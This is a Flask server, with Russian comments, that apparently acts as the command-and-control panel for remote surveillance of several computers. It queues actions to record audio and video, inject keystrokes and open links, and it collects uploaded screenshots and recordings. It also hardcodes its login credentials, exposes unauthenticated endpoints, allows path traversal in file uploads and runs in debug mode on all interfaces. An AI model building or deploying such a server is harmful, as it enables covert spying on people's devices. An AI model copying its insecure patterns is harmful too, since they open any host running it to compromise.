from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import os

app = Flask(__name__)
app.secret_key = "supersecretkey"

# Папки для хранения (создаются автоматически)
for folder in ["screenshots", "videos", "audio"]:
    os.makedirs(folder, exist_ok=True)

# Устройства и команды
devices = {"PC1": "PC1", "PC2": "PC2", "Laptop1": "Laptop1"}
commands = {}

# Логин
USERNAME = "MassoniAdmin"
PASSWORD = "DenMason"

@app.route("/", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        if username == USERNAME and password == PASSWORD:
            session["logged_in"] = True
            return redirect(url_for("dashboard"))
        return "Неверный логин или пароль!"
    return render_template("login.html")

@app.route("/dashboard", methods=["GET", "POST"])
def dashboard():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    if request.method == "POST":
        selected_devices = request.form.getlist("devices")
        action = request.form["action"]
        params = {}
        if action == "link":
            params["url"] = request.form["url"]
        elif action in ["video", "audio"]:
            params["seconds"] = request.form["seconds"]
        elif action == "keyboard":
            params["text"] = request.form["text"]
        elif action == "volume":
            params["level"] = request.form["level"]
        for dev in selected_devices:
            commands[dev] = {"action": action, "params": params}
    return render_template("dashboard.html", devices=devices)

@app.route("/storage")
def storage():
    if not session.get("logged_in"):
        return redirect(url_for("login"))
    screenshots = os.listdir("screenshots")
    videos = os.listdir("videos")
    audio_files = os.listdir("audio")
    return render_template("storage.html", screenshots=screenshots, videos=videos, audio=audio_files)

@app.route("/get_command")
def get_command():
    device = request.args.get("device")
    return jsonify(commands.get(device, {"action": "none", "params": {}}))

@app.route("/upload/<type>", methods=["POST"])
def upload(type):
    file = request.files["file"]
    file.save(os.path.join(type, file.filename))
    return "OK"

@app.route("/rename_device", methods=["POST"])
def rename_device():
    old_name = request.form["old_name"]
    new_name = request.form["new_name"]
    devices[new_name] = devices.pop(old_name)
    return redirect(url_for("dashboard"))

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=True)
